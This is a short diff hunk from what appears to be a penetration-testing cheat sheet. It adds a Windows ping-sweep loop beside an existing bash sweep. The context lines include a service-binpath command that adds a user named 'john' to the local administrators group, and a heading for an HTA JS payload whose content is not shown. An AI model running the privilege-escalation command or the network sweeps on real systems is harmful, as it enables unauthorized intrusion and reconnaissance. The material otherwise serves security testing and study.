@@ -5,6 +5,7 @@ sc config SNMPTRAP binpath= "cmd.exe /c net localgroup administrators john /add"
 ```
 ```bash
 for i in {1..255} ;do (ping -c 1 192.168.110.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
+cmd.exe /C '(for /L %a IN (1,1,254) DO ping /n 1 /w 1 192.168.210.%a) | find "Reply"'
 ```
 
 HTA JS PAYLOAD
